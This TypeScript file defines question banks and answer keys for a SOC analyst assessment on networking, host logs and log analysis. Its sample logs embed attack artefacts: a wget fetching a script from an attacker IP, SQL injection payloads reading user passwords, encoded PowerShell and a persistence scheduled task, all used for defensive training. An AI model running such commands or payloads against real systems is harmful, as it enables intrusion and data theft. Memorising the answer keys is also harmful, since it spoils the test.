import { AssessmentTest } from '../../types';
import { caseStudy, choice, match, multi, order, short, written } from '../questionKit';
import { B, J, P, S, ModuleSkeleton, tagged } from './kit';
import { roleMain } from './roleKit';

// The SOC analyst's fundamentals: networking, Linux and Windows, logs, triage, phishing, reporting, and identity and
// cloud (where most 2026 attacks start), then a shift working an alert queue to a written incident report.

const SOC: ['SOC Analyst'] = ['SOC Analyst'];

export const SECURITY_TESTS: AssessmentTest[] = [
  roleMain(
    'test-net-01',
    'Networking for Security Analysts',
    'Cyber Security',
    'IP addresses, ports and protocols, DNS, HTTP and TLS, and reading traffic and firewall logs to tell normal from suspicious.',
    ['Networking', 'TCP/IP', 'DNS', 'Firewalls'],
    [...SOC, 'Platform & DevOps']
  ),
  roleMain(
    'test-os-01',
    'Linux & Windows for Security Analysts',
    'Cyber Security',
    'Linux commands and permissions, Windows events and Active Directory, and where attackers hide: processes, services and persistence.',
    ['Linux', 'Windows', 'Active Directory', 'Event Logs'],
    SOC
  ),
  roleMain(
    'test-logs-01',
    'Log Analysis',
    'Cyber Security',
    'Know your log sources, search and filter them, and spot attack patterns, then work through real auth and web logs and fix an AI-written SIEM query.',
    ['Log Analysis', 'SIEM', 'Splunk / KQL', 'Threat Detection'],
    SOC
  ),
  roleMain(
    'test-triage-01',
    'Alert Triage',
    'Cyber Security',
    'Prioritise a queue, investigate an alert to a verdict, map it to MITRE ATT&CK, and correct an AI assistant’s triage.',
    ['Alert Triage', 'MITRE ATT&CK', 'Threat Intelligence', 'EDR'],
    SOC
  ),
  roleMain(
    'test-phish-01',
    'Phishing Detection & Response',
    'Cyber Security',
    'Read headers and SPF, DKIM and DMARC, judge links and attachments, and respond when someone clicks.',
    ['Phishing', 'Email Security', 'SPF/DKIM/DMARC', 'Incident Response'],
    SOC
  ),
  roleMain(
    'test-ir-01',
    'Incident Reporting',
    'Cyber Security',
    'Build a timeline from evidence, judge impact and severity, and write for engineers, executives and regulators.',
    ['Incident Reporting', 'Incident Response', 'Communication', 'GDPR'],
    SOC
  ),
  roleMain(
    'test-idcloud-01',
    'Identity & Cloud Security',
    'Cyber Security',
    'Password spraying, MFA fatigue, impossible travel and token theft, cloud audit logs and misconfigurations, and hardening identity.',
    ['Identity Security', 'Entra ID / Azure AD', 'Cloud Security', 'MFA'],
    [...SOC, 'Platform & DevOps']
  ),
  roleMain(
    'test-sim-soc-01',
    'SOC Analyst Project: The Monday Queue',
    'Cyber Security',
    'Start your shift with a queue of alerts. Triage them, find the real attack hiding in the logs, and write the incident report with next steps.',
    ['Alert Triage', 'Log Analysis', 'Incident Response', 'Incident Reporting'],
    SOC,
    'Professional'
  ),
];

// ---------- Networking ----------
export const NETWORK_MODULE: ModuleSkeleton = {
  familyId: 'test-net-01',
  aspects: [
    { id: 'ip', name: 'IPs, Ports & Protocols', summary: 'Addresses, ports and TCP/UDP: who is talking to whom.' },
    { id: 'web', name: 'DNS, HTTP & TLS', summary: 'The protocols most attacks ride on.' },
    { id: 'traffic', name: 'Traffic & Firewalls', summary: 'Reading connection and firewall logs for what doesn’t belong.' },
    { id: 'case', name: 'Network Cases', summary: 'Real logs and captures: read them and decide.' },
  ],
  tags: {},
  bank: [
    ...tagged(
      'ip',
      B,
      match('m-nt-i-b1', 'Common Ports', 'Match each port to its usual service.', [
        ['22', 'SSH'],
        ['53', 'DNS'],
        ['443', 'HTTPS'],
        ['3389', 'RDP (Remote Desktop)'],
      ])
    ),
    ...tagged(
      'ip',
      J,
      choice(
        'm-nt-i-j1',
        'Private Addresses',
        'Which of these is a private (internal) IPv4 address?',
        ['10.4.22.17', '8.8.8.8', '81.2.69.142', '172.217.16.14'],
        0
      )
    ),
    ...tagged(
      'ip',
      P,
      choice(
        'm-nt-i-p1',
        'TCP or UDP?',
        'Why does a SYN with no completed handshake matter in a connection log?',
        ['It shows an attempt that never became a session: many of them across ports is a scan', 'It means data was stolen', 'It’s how UDP works', 'It means the firewall failed'],
        0
      )
    ),
    ...tagged(
      'ip',
      S,
      choice(
        'm-nt-i-s1',
        'Beaconing',
        'A laptop connects to the same external IP every 60 seconds, ±2 seconds, with tiny payloads, all night. What does that suggest?',
        ['Malware beaconing to a command-and-control server; regular timing at night is the tell', 'A software update', 'Normal web browsing', 'A DNS problem'],
        0
      )
    ),
    ...tagged(
      'web',
      B,
      choice(
        'm-nt-w-b1',
        'What DNS Does',
        'What does DNS do?',
        ['Turns names like example.com into IP addresses', 'Encrypts web traffic', 'Blocks malware', 'Assigns IP addresses to laptops'],
        0
      )
    ),
    ...tagged(
      'web',
      J,
      match('m-nt-w-j1', 'Status Codes', 'Match each HTTP status code to its meaning.', [
        ['200', 'OK'],
        ['301', 'Moved permanently (a redirect)'],
        ['401', 'Not authenticated'],
        ['500', 'Server error'],
      ])
    ),
    ...tagged(
      'web',
      P,
      choice(
        'm-nt-w-p1',
        'Long, Random Subdomains',
        'DNS logs show one host querying thousands of names like a8f3k2…q9.example-cdn.top, each different. What could it be?',
        ['DNS tunnelling: data hidden in the subdomain names', 'A busy website', 'A DNS cache refresh', 'Normal CDN behaviour'],
        0
      )
    ),
    ...tagged(
      'web',
      S,
      choice(
        'm-nt-w-s1',
        'Encrypted Traffic',
        'Most malicious traffic is now HTTPS. Without decrypting it, what can still help you spot it?',
        ['The SNI hostname, certificate details, TLS fingerprints (like JA3/JA4), destination reputation and timing patterns', 'Nothing', 'Only the port number', 'Packet colour in Wireshark'],
        0
      )
    ),
    ...tagged(
      'traffic',
      B,
      choice(
        'm-nt-t-b1',
        'A Firewall Deny',
        'A firewall log shows DENY from 45.33.10.2 to your web server on port 22. What does it mean?',
        ['The firewall blocked an outside attempt to reach SSH on the server', 'The server was hacked', 'Your web site is down', 'The server sent data out'],
        0
      )
    ),
    ...tagged(
      'traffic',
      J,
      choice(
        'm-nt-t-j1',
        'A Port Scan',
        'One external IP touched ports 21, 22, 23, 25, 80, 110, 143, 443, 445 and 3389 on one server within 4 seconds. What is it?',
        ['A port scan, looking for open services', 'A user logging in', 'A backup job', 'A DDoS'],
        0
      )
    ),
    ...tagged(
      'traffic',
      P,
      choice(
        'm-nt-t-p1',
        'Unusual Outbound',
        'A finance PC uploaded 4 GB to an IP in a country you don’t do business with, at 02:00. What do you do?',
        ['Treat it as possible data exfiltration: check the process that made the connection, isolate if confirmed, and escalate', 'Ignore it; uploads are normal', 'Block the country and close the alert', 'Email the user to ask'],
        0
      )
    ),
    ...tagged(
      'traffic',
      S,
      choice(
        'm-nt-t-s1',
        'Lateral Movement',
        'One workstation starts connecting to port 445 on 200 other workstations. Normal is servers only. What’s the likely story?',
        ['Lateral movement or worm-like spread over SMB; contain that host and look at what ran on it', 'A file share migration', 'A printer driver update', 'Normal Windows behaviour'],
        0
      )
    ),
    ...tagged('case', B, short('m-nt-x-b1', 'Which Service?', 'A log shows a connection to 10.0.5.20 on port 3389. What service is that, usually?', ['RDP', 'remote desktop', 'remote desktop protocol'])),
    ...tagged(
      'case',
      J,
      caseStudy(
        'm-nt-x-j',
        'Firewall Log',
        `time      action  src_ip         dst_ip       dst_port
09:14:02  DENY    185.220.101.7  10.0.1.10    22
09:14:02  DENY    185.220.101.7  10.0.1.10    23
09:14:03  DENY    185.220.101.7  10.0.1.10    3389
09:14:03  ALLOW   185.220.101.7  10.0.1.10    443
09:14:04  DENY    185.220.101.7  10.0.1.10    445
09:20:11  ALLOW   10.0.2.31      52.97.4.12   443
09:20:15  ALLOW   10.0.2.31      52.97.4.12   443`,
        'Firewall log'
      ),
      short('m-nt-x-j1', 'The Scanner', 'Which IP is scanning?', ['185.220.101.7'], { taskId: 'm-nt-x-j' }),
      short('m-nt-x-j2', 'Got Through', 'Which port did the scanner reach?', ['443'], { taskId: 'm-nt-x-j' }),
      written(
        'm-nt-x-j3',
        'Your Read',
        'Write what you see in this log and what, if anything, you’d do.',
        [
          'Identifies a quick port scan from 185.220.101.7, mostly blocked',
          'Notes 443 was allowed, as expected for a web server, so it’s worth checking the web logs for that IP',
          'Sees the 10.0.2.31 traffic as ordinary outbound HTTPS',
          'Proportionate action, e.g. block or watch the IP, check if it’s a known scanner or Tor exit, no panic',
        ],
        `185.220.101.7 ran a fast scan of the web server: SSH, Telnet, RDP and SMB were all denied, and only 443 got through, which is correct for a web server. Scans like this are common; the follow-up is to check the web server's logs for what that IP requested on 443, and to look the IP up (this range is often Tor exits). The 10.0.2.31 lines are an internal machine making normal HTTPS calls. I'd block the IP at the edge, note it, and close unless the web logs show something.`,
        { taskId: 'm-nt-x-j' }
      )
    ),
    ...tagged(
      'case',
      P,
      caseStudy(
        'm-nt-x-p',
        'DNS Log and an AI Summary',
        `DNS queries from host FIN-PC-07, 01:00–01:05:

01:00:02  q=4a6f686e.ex7-cdn.top
01:00:03  q=446f6520.ex7-cdn.top
01:00:03  q=53534e3a.ex7-cdn.top
01:00:04  q=31323334.ex7-cdn.top
… 2,800 more queries to *.ex7-cdn.top in 5 minutes …
01:04:59  q=www.microsoft.com

An AI assistant summarised: "FIN-PC-07 is querying a content delivery network, likely for Windows updates (see www.microsoft.com). Volume is high but benign. No action needed."`,
        'DNS log and AI summary'
      ),
      multi(
        'm-nt-x-p1',
        'What the AI Got Wrong',
        'Which points show the AI’s summary is wrong? Tick all that apply.',
        [
          'The subdomains are hex: 4a6f686e decodes to "John", so data is being spelled out in DNS names',
          'Thousands of unique subdomains of one odd domain in minutes is a tunnelling pattern, not a CDN',
          'One query to www.microsoft.com doesn’t explain 2,800 to ex7-cdn.top',
          'A finance PC at 01:00 with this volume needs investigating',
          'DNS can’t carry data',
        ],
        [0, 1, 2, 3],
        { taskId: 'm-nt-x-p' }
      ),
      written(
        'm-nt-x-p2',
        'The Right Call',
        'Write the correct assessment and your next steps.',
        [
          'Calls it likely DNS tunnelling / exfiltration, with the hex-encoded names as evidence',
          'Finds the process on FIN-PC-07 making the queries (EDR) and what data it might be',
          'Contains: isolate the host and sinkhole or block the domain',
          'Escalates as a possible data breach, keeping the evidence',
        ],
        `This is very likely DNS tunnelling. The labels are hex — 4a6f686e 446f6520 53534e3a decodes to "John Doe SSN:" — so data is being smuggled out in the query names, thousands in five minutes, from a finance PC at 1am. The microsoft.com query is unrelated. Next: use EDR to find the process issuing the queries, isolate FIN-PC-07, block and sinkhole ex7-cdn.top, preserve the DNS and host logs, and escalate as a possible breach of personal data.`,
        { taskId: 'm-nt-x-p' }
      )
    ),
    ...tagged(
      'case',
      S,
      caseStudy(
        'm-nt-x-s',
        'NetFlow From One Host',
        `NetFlow for workstation HR-LT-14 (10.0.3.44), 14:00–14:30:

dst              dst_port  connections  bytes_out
10.0.0.5 (DC)    445       12           40 KB
10.0.0.5 (DC)    389       30           90 KB
10.0.3.0/24      445       212          1.1 MB
10.0.3.0/24      135       198          600 KB
91.215.85.12     443       30 (every 60s) 8 KB`,
        'NetFlow summary'
      ),
      multi(
        'm-nt-x-s1',
        'What’s Abnormal',
        'Which lines are worrying? Tick all that apply.',
        [
          '445 and 135 to 200+ other workstations',
          'A connection every 60 seconds to an outside IP',
          'LDAP (389) to the domain controller in itself',
          'Small amounts of SMB to the domain controller',
        ],
        [0, 1],
        { taskId: 'm-nt-x-s' }
      ),
      written(
        'm-nt-x-s2',
        'Your Assessment',
        'Write your assessment and the order you’d act in.',
        [
          'Reads it as a compromised host: a C2 beacon plus SMB/RPC spreading across the subnet',
          'Contains first: isolate HR-LT-14 through EDR without powering it off',
          'Scopes: which of the 200 hosts accepted connections or ran anything, and which account was used',
          'Blocks the external IP, resets the account’s credentials and escalates as an active incident',
        ],
        `HR-LT-14 looks compromised and is spreading. A 60-second beacon to 91.215.85.12 is command-and-control; 200+ connections on 445 and 135 to other workstations is lateral movement over SMB and RPC. LDAP and some SMB to the DC alone are normal. Order: isolate HR-LT-14 through EDR (keep it powered for forensics), block 91.215.85.12, then check which workstations accepted those connections or show new services or processes, and which account was used — reset it. This is an active incident; I'd escalate now, not at end of shift.`,
        { taskId: 'm-nt-x-s' }
      )
    ),
  ],
};

// ---------- Linux & Windows ----------
export const OS_MODULE: ModuleSkeleton = {
  familyId: 'test-os-01',
  aspects: [
    { id: 'linux', name: 'Linux', summary: 'Commands, users, permissions and logs on Linux servers.' },
    { id: 'windows', name: 'Windows & Active Directory', summary: 'Event IDs, accounts and the domain.' },
    { id: 'persist', name: 'Processes & Persistence', summary: 'Where attackers run, and how they stay.' },
    { id: 'case', name: 'Host Cases', summary: 'Real command output and events: read them and decide.' },
  ],
  tags: {},
  bank: [
    ...tagged(
      'linux',
      B,
      match('m-os-l-b1', 'Linux Commands', 'Match each command to what it does.', [
        ['ls -la', 'List files, including hidden ones, with permissions'],
        ['ps aux', 'List running processes'],
        ['tail -f /var/log/auth.log', 'Follow the authentication log as it grows'],
        ['whoami', 'Show the current user'],
      ])
    ),
    ...tagged(
      'linux',
      J,
      short('m-os-l-j1', 'Permissions', 'A file shows -rwxr-xr--. Can users who aren’t the owner or in the group run it? (yes or no)', ['no'])
    ),
    ...tagged(
      'linux',
      P,
      choice(
        'm-os-l-p1',
        'SUID',
        'find / -perm -4000 lists /tmp/.x/bash with the SUID bit set, owned by root. Why worry?',
        ['A SUID root copy of bash in a hidden /tmp folder lets any user get a root shell: a backdoor', 'SUID files are normal in /tmp', 'It’s a temporary file', 'bash is always SUID'],
        0
      )
    ),
    ...tagged(
      'linux',
      S,
      choice(
        'm-os-l-s1',
        'Cleaned Logs',
        'On a web server, /var/log/auth.log is empty, and the server has been up 40 days. What does that suggest, and where else can you look?',
        ['Logs may have been wiped; check forwarded copies in the SIEM, journalctl, wtmp/lastlog and shell histories', 'The server has had no logins', 'Log rotation is normal', 'Nothing to see'],
        0
      )
    ),
    ...tagged(
      'windows',
      B,
      match('m-os-w-b1', 'Windows Event IDs', 'Match each Security event ID to its meaning.', [
        ['4624', 'Successful logon'],
        ['4625', 'Failed logon'],
        ['4720', 'A user account was created'],
        ['1102', 'The audit log was cleared'],
      ])
    ),
    ...tagged(
      'windows',
      J,
      choice(
        'm-os-w-j1',
        'Logon Type 10',
        'A 4624 event shows Logon Type 10. What kind of logon was it?',
        ['Remote Desktop (RemoteInteractive)', 'A network share (Network)', 'At the keyboard (Interactive)', 'A service starting'],
        0
      )
    ),
    ...tagged(
      'windows',
      P,
      choice(
        'm-os-w-p1',
        'A New Domain Admin',
        'At 23:10 an account “svc_backup2” is created (4720) and added to Domain Admins (4728) by a helpdesk account. What do you do?',
        ['Treat it as high priority: check with the helpdesk owner and change records now, and if not approved disable both accounts and escalate', 'Nothing; helpdesk creates accounts', 'Wait until morning', 'Delete the event'],
        0
      )
    ),
    ...tagged(
      'windows',
      S,
      choice(
        'm-os-w-s1',
        'Kerberoasting',
        'Many 4769 events (service ticket requests) with RC4 encryption come from one user for dozens of service accounts in a minute. What’s happening?',
        ['Kerberoasting: requesting service tickets to crack service-account passwords offline', 'Normal login traffic', 'A printer problem', 'A password reset'],
        0
      )
    ),
    ...tagged(
      'persist',
      B,
      choice(
        'm-os-p-b1',
        'Persistence',
        'In security, what does “persistence” mean?',
        ['How an attacker keeps access after a reboot or password change', 'Keeping logs for a long time', 'A long-running backup', 'Retrying a login'],
        0
      )
    ),
    ...tagged(
      'persist',
      J,
      multi(
        'm-os-p-j1',
        'Where Malware Persists',
        'Which are common places attackers set up persistence? Tick all that apply.',
        ['Scheduled tasks or cron jobs', 'Registry Run keys', 'New services', 'The recycle bin icon'],
        [0, 1, 2]
      )
    ),
    ...tagged(
      'persist',
      P,
      choice(
        'm-os-p-p1',
        'Odd Parent',
        'EDR shows WINWORD.EXE starting powershell.exe -enc JABzAD0A… What does that suggest?',
        ['A malicious document running encoded PowerShell: Word shouldn’t start PowerShell', 'Word updating itself', 'A macro the user wrote', 'Normal Office behaviour'],
        0
      )
    ),
    ...tagged(
      'persist',
      S,
      choice(
        'm-os-p-s1',
        'Living off the Land',
        'An attacker uses only built-in tools (PowerShell, certutil, wmic, rundll32). How do you detect them?',
        ['By behaviour: unusual parent-child processes, command lines, network use by these tools and who runs them, against a baseline', 'Antivirus signatures', 'Block all built-in tools', 'You can’t'],
        0
      )
    ),
    ...tagged(
      'case',
      B,
      short('m-os-x-b1', 'Failed Logons', 'Which Windows Security event ID records a failed logon?', ['4625'])
    ),
    ...tagged(
      'case',
      J,
      caseStudy(
        'm-os-x-j',
        'auth.log',
        `Nov  4 02:11:03 web01 sshd[2211]: Failed password for root from 103.44.8.9 port 50122 ssh2
Nov  4 02:11:04 web01 sshd[2213]: Failed password for root from 103.44.8.9 port 50140 ssh2
Nov  4 02:11:04 web01 sshd[2215]: Failed password for admin from 103.44.8.9 port 50151 ssh2
… 1,180 more failures from 103.44.8.9 …
Nov  4 02:31:47 web01 sshd[9031]: Accepted password for deploy from 103.44.8.9 port 61002 ssh2
Nov  4 02:32:10 web01 sudo: deploy : TTY=pts/0 ; COMMAND=/usr/bin/wget http://103.44.8.9/k.sh -O /tmp/k.sh`,
        '/var/log/auth.log'
      ),
      short('m-os-x-j1', 'The Account', 'Which account did the attacker get into?', ['deploy'], { taskId: 'm-os-x-j' }),
      choice(
        'm-os-x-j2',
        'What Happened',
        'What does the log show?',
        ['A brute-force attack that succeeded on deploy, then a download of a script with sudo', 'Failed attacks only', 'A normal deployment', 'A log rotation'],
        0,
        { taskId: 'm-os-x-j' }
      ),
      written(
        'm-os-x-j3',
        'Next Steps',
        'Write your next steps on web01.',
        [
          'Treats web01 as compromised: isolate it (or block the IP) while keeping evidence',
          'Looks at what /tmp/k.sh did: processes, cron, new users, SSH keys, outbound connections',
          'Disables or resets the deploy account and removes password SSH login',
          'Checks other servers for the same IP and account, and escalates',
        ],
        `web01 is compromised: 1,000+ guesses, then a successful password login as deploy from the same IP, which immediately used sudo to download k.sh. I'd isolate web01 (or at least block 103.44.8.9) without wiping it, grab /tmp/k.sh and check what it did — new processes, cron jobs, users, authorized_keys, outbound connections. Lock the deploy account, switch SSH to keys only and stop deploy having broad sudo. Then search the SIEM for that IP and the deploy account on every other server, and escalate as an incident.`,
        { taskId: 'm-os-x-j' }
      )
    ),
    ...tagged(
      'case',
      P,
      caseStudy(
        'm-os-x-p',
        'Process Tree and an AI Answer',
        `EDR process tree on ACC-PC-02, 10:42:

outlook.exe
 └ winword.exe  "Invoice_Nov.docm"
    └ powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA…
       └ rundll32.exe C:\\Users\\Public\\upd.dll,Start
schtasks.exe /create /tn "OneDrive Update" /tr "rundll32 C:\\Users\\Public\\upd.dll,Start" /sc onlogon

An AI assistant explained: "This is Microsoft Word updating OneDrive via PowerShell. The scheduled task is created by OneDrive's installer. Benign."`,
        'EDR and AI answer'
      ),
      multi(
        'm-os-x-p1',
        'What the AI Got Wrong',
        'Which points contradict the AI? Tick all that apply.',
        [
          'A macro document (.docm) from email starting hidden, encoded PowerShell is a classic malware chain',
          'A DLL run from C:\\Users\\Public isn’t how OneDrive updates',
          'The scheduled task is persistence dressed up with a believable name',
          'OneDrive’s installer doesn’t run from inside Word',
          'PowerShell is never used legitimately',
        ],
        [0, 1, 2, 3],
        { taskId: 'm-os-x-p' }
      ),
      written(
        'm-os-x-p2',
        'Your Response',
        'Write the correct verdict and your response.',
        [
          'Malicious: a phishing document dropped and ran upd.dll, with a logon task for persistence',
          'Isolates ACC-PC-02 and collects the DLL, document and decoded PowerShell',
          'Removes persistence only after evidence is taken, and resets the user’s credentials',
          'Searches for the same email, hash and task name across the company',
        ],
        `Malicious. A macro invoice from Outlook launched hidden, encoded PowerShell, which ran a DLL from C:\\Users\\Public and created a logon scheduled task named to look like OneDrive. I'd isolate ACC-PC-02, collect the .docm, the DLL and decode the PowerShell, then reset the user's password and sessions. Search mail for the same attachment and sender, and EDR for the DLL's hash and the "OneDrive Update" task on other machines. Remove the task and files once evidence is safe, and escalate.`,
        { taskId: 'm-os-x-p' }
      )
    ),
    ...tagged(
      'case',
      S,
      caseStudy(
        'm-os-x-s',
        'Domain Controller Events',
        `Security events on DC01:

22:58  4625 x 40   Account: j.patel        Source: 10.0.3.44   (failed logons)
23:02  4624        Account: j.patel        Logon type 3        Source: 10.0.3.44
23:05  4769 x 35   Account: j.patel        Service tickets, encryption 0x17 (RC4)
23:40  4624        Account: svc_sql        Logon type 3        Source: 10.0.3.44
23:41  4728        svc_sql added to Domain Admins by svc_sql
23:44  1102        The audit log was cleared`,
        'Event log'
      ),
      order(
        'm-os-x-s1',
        'The Attack in Order',
        'Put the attacker’s steps in order.',
        [
          'Guessed j.patel’s password from 10.0.3.44',
          'Logged on as j.patel',
          'Requested RC4 service tickets (Kerberoasting)',
          'Logged on as svc_sql with a cracked password',
          'Made svc_sql a Domain Admin',
          'Cleared the audit log',
        ],
        { taskId: 'm-os-x-s' }
      ),
      written(
        'm-os-x-s2',
        'Containment',
        'This is a domain compromise. Write your containment priorities.',
        [
          'Escalates immediately as a critical incident with the incident lead',
          'Isolates 10.0.3.44 and disables j.patel and svc_sql',
          'Rotates privileged and service account passwords, including krbtgt twice, as part of the domain recovery plan',
          'Hunts for other new admins, persistence and access since 22:58, using copies of logs held outside the DC (the SIEM)',
        ],
        `Critical incident: escalate now. Isolate 10.0.3.44 and disable j.patel and svc_sql (remove svc_sql from Domain Admins). Because an attacker held Domain Admin, plan a domain-wide credential reset: all privileged and service accounts, and krbtgt reset twice, with the incident lead. The local log was cleared, so use the SIEM's copies to find everything since 22:58 — other new accounts, group changes, GPOs, scheduled tasks and logons by svc_sql elsewhere. Make service accounts long random passwords or managed accounts and turn off RC4 afterwards.`,
        { taskId: 'm-os-x-s' }
      )
    ),
  ],
};

// ---------- Log analysis ----------
const WEB_LOG = `185.12.4.9 - - [04/Nov/2026:10:01:12] "GET /products?id=12 HTTP/1.1" 200 5120
185.12.4.9 - - [04/Nov/2026:10:01:13] "GET /products?id=12' HTTP/1.1" 500 312
185.12.4.9 - - [04/Nov/2026:10:01:15] "GET /products?id=12 OR 1=1-- HTTP/1.1" 200 98411
185.12.4.9 - - [04/Nov/2026:10:01:19] "GET /products?id=12 UNION SELECT email,password FROM users-- HTTP/1.1" 200 44102
81.2.69.14 - - [04/Nov/2026:10:02:03] "GET /basket HTTP/1.1" 200 2210
185.12.4.9 - - [04/Nov/2026:10:02:30] "GET /admin/login HTTP/1.1" 200 1800`;

export const LOGS_MODULE: ModuleSkeleton = {
  familyId: 'test-logs-01',
  aspects: [
    { id: 'sources', name: 'Log Sources', summary: 'Which log answers which question.' },
    { id: 'search', name: 'Searching & Filtering', summary: 'grep, SIEM queries and getting to the lines that matter.' },
    { id: 'patterns', name: 'Attack Patterns', summary: 'Brute force, injection, spraying and exfiltration in the lines.' },
    { id: 'case', name: 'Log Cases', summary: 'Real web, auth and SIEM output: read it, query it, decide.' },
  ],
  tags: {},
  bank: [
    ...tagged(
      'sources',
      B,
      match('m-lg-s-b1', 'Which Log?', 'Match each question to the log that answers it.', [
        ['Who logged in to the Linux server?', 'auth.log / secure'],
        ['What pages did this IP request?', 'Web server access log'],
        ['Which process opened this connection?', 'EDR telemetry'],
        ['Was this connection blocked at the edge?', 'Firewall log'],
      ])
    ),
    ...tagged(
      'sources',
      J,
      choice(
        'm-lg-s-j1',
        'Time Zones',
        'The firewall logs in UTC and the web server in UK local time (BST, UTC+1). An attack hits the firewall at 09:00. When will it appear in the web log?',
        ['10:00', '08:00', '09:00', 'It can’t be worked out'],
        0
      )
    ),
    ...tagged(
      'sources',
      P,
      choice(
        'm-lg-s-p1',
        'A Gap in Coverage',
        'You’re asked whether an attacker used the VPN. The VPN logs aren’t in the SIEM. What do you say?',
        ['That it can’t be answered from the SIEM; get the VPN logs from the appliance, and raise the gap so they’re collected', 'No, there’s no sign of it', 'Yes, probably', 'Check the firewall instead and say no'],
        0
      )
    ),
    ...tagged(
      'sources',
      S,
      choice(
        'm-lg-s-s1',
        'Log Budget',
        'The SIEM licence only covers half your log volume. What do you keep?',
        ['Prioritise by detection value: identity, EDR, email, VPN, firewall denies at the edge, cloud audit logs; archive the rest cheaply for investigations', 'The newest logs', 'Whatever is largest', 'Only firewall allows'],
        0
      )
    ),
    ...tagged(
      'search',
      B,
      choice(
        'm-lg-q-b1',
        'grep',
        'Which command finds every line in auth.log containing “Failed password”?',
        ['grep "Failed password" auth.log', 'cat auth.log', 'ls auth.log', 'rm auth.log'],
        0
      )
    ),
    ...tagged(
      'search',
      J,
      choice(
        'm-lg-q-j1',
        'Counting by IP',
        'You want failed SSH logins counted per source IP, highest first. Which Splunk search?',
        [
          'sourcetype=linux_secure "Failed password" | stats count by src_ip | sort -count',
          'sourcetype=linux_secure | table _raw',
          '"Failed password" | head 10',
          'sourcetype=linux_secure | stats count',
        ],
        0
      )
    ),
    ...tagged(
      'search',
      P,
      choice(
        'm-lg-q-p1',
        'Password Spray Query',
        'Which KQL query finds IPs failing sign-in to many different accounts (a password spray) in an hour?',
        [
          'SigninLogs | where ResultType != 0 | summarize users = dcount(UserPrincipalName) by IPAddress, bin(TimeGenerated, 1h) | where users > 20',
          'SigninLogs | where ResultType == 0 | take 20',
          'SigninLogs | summarize count() by UserPrincipalName',
          'SigninLogs | where IPAddress == "unknown"',
        ],
        0
      )
    ),
    ...tagged(
      'search',
      S,
      choice(
        'm-lg-q-s1',
        'A Noisy Rule',
        'A detection fires 400 times a day, 98% from one backup server’s normal behaviour. What do you do?',
        ['Tune it: exclude that server’s known-good pattern narrowly (account, process, destination), document why, and keep the rule for everything else', 'Turn the rule off', 'Leave it; analysts can ignore them', 'Exclude the whole server from all rules'],
        0
      )
    ),
    ...tagged(
      'patterns',
      B,
      choice(
        'm-lg-p-b1',
        'Brute Force',
        'Hundreds of failed logins to one account from one IP in a few minutes is…',
        ['A brute-force attack', 'A password spray', 'Normal', 'A DDoS'],
        0
      )
    ),
    ...tagged(
      'patterns',
      J,
      match('m-lg-p-j1', 'Name the Pattern', 'Match each pattern to the attack.', [
        ['One IP, one failure each on 300 different accounts', 'Password spraying'],
        ["id=12' OR 1=1-- in a URL", 'SQL injection'],
        ['../../etc/passwd in a URL', 'Path traversal'],
        ['<script> in a search box parameter', 'Cross-site scripting'],
      ])
    ),
    ...tagged(
      'patterns',
      P,
      choice(
        'm-lg-p-p1',
        'Impossible Travel',
        'A user signs in from London at 09:00 and from Singapore at 09:20. What do you check before calling it an attack?',
        ['Whether one is a VPN, proxy or cloud service IP, the devices and apps used, and whether MFA was passed on each', 'Nothing; it’s always an attack', 'Only the time zones', 'Whether the user travels often'],
        0
      )
    ),
    ...tagged(
      'patterns',
      S,
      choice(
        'm-lg-p-s1',
        'Low and Slow',
        'An attacker tries one password per account per day across 5,000 accounts. Why do per-account lockout rules miss it, and what catches it?',
        ['No account ever hits the lockout threshold; look across accounts: failures by source, by password pattern and by ASN over days', 'They don’t miss it', 'Lower the lockout to 1 attempt', 'Only MFA logs can show it'],
        0
      )
    ),
    ...tagged('case', B, short('m-lg-x-b1', 'Status Code', 'In a web log line ending "200 98411", what is the HTTP status code?', ['200'])),
    ...tagged(
      'case',
      J,
      caseStudy('m-lg-x-j', 'Web Access Log', WEB_LOG, 'access.log'),
      short('m-lg-x-j1', 'The Attacker', 'Which IP is attacking the site?', ['185.12.4.9'], { taskId: 'm-lg-x-j' }),
      choice(
        'm-lg-x-j2',
        'The Attack',
        'What kind of attack is it?',
        ['SQL injection', 'Brute force', 'DDoS', 'Phishing'],
        0,
        { taskId: 'm-lg-x-j' }
      ),
      written(
        'm-lg-x-j3',
        'How Bad?',
        'Did the attack succeed? Write what the log tells you and what you’d do.',
        [
          'Reads the sizes: a quote caused a 500 (error), then OR 1=1 returned 98 KB and UNION SELECT 44 KB, so data very likely came back',
          'Concludes user emails and password hashes may have been taken',
          'Notes the attacker then went to /admin/login',
          'Next steps: block the IP, fix the query (parameterise), check the database logs, reset credentials and escalate as a likely breach',
        ],
        `Very likely, yes. The quote at 10:01:13 broke the query (500), which tells the attacker it's injectable; OR 1=1 then returned 98 KB instead of the usual 5 KB, and the UNION SELECT of users' emails and passwords returned 44 KB with a 200. The attacker then went to /admin/login, probably to use what they got. Block 185.12.4.9 and look for the same pattern from other IPs, get the developers to parameterise that query today, check database logs for what was returned, force password resets and admin credential rotation, and escalate as a likely breach of personal data.`,
        { taskId: 'm-lg-x-j' }
      )
    ),
    ...tagged(
      'case',
      P,
      caseStudy(
        'm-lg-x-p',
        'An AI-Written Query',
        `You asked an AI assistant for a Splunk search to find hosts that might be beaconing: many connections to the same external IP at regular intervals. It wrote:

index=firewall action=allowed
| stats count by dest_ip
| where count > 100
| sort -count

"This finds beaconing hosts."`,
        'AI assistant’s answer'
      ),
      multi(
        'm-lg-x-p1',
        'What’s Wrong',
        'Which are real problems with the AI’s search? Tick all that apply.',
        [
          'It counts by destination only, so you can’t see which internal host is beaconing',
          'It doesn’t look at regularity (time between connections), which is what makes beaconing',
          'Popular services (Microsoft, Google) will top the list, burying real beacons',
          'It doesn’t limit to outbound traffic to external addresses',
          'stats can’t count in Splunk',
        ],
        [0, 1, 2, 3],
        { taskId: 'm-lg-x-p' }
      ),
      written(
        'm-lg-x-p2',
        'A Better Search',
        'Write (or describe) a better search for beaconing.',
        [
          'Groups by source host and destination',
          'Measures the gaps between connections (e.g. streamstats/delta of _time) and looks for low variation',
          'Filters to outbound traffic to external IPs, and excludes known-good destinations or popular domains',
          'Adds a minimum number of connections and time window so results are meaningful',
        ],
        `index=firewall action=allowed direction=outbound NOT dest_ip IN (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
| sort 0 src_ip dest_ip _time
| streamstats current=f last(_time) as prev by src_ip dest_ip
| eval gap=_time-prev
| stats count avg(gap) as avg_gap stdev(gap) as sd_gap by src_ip dest_ip
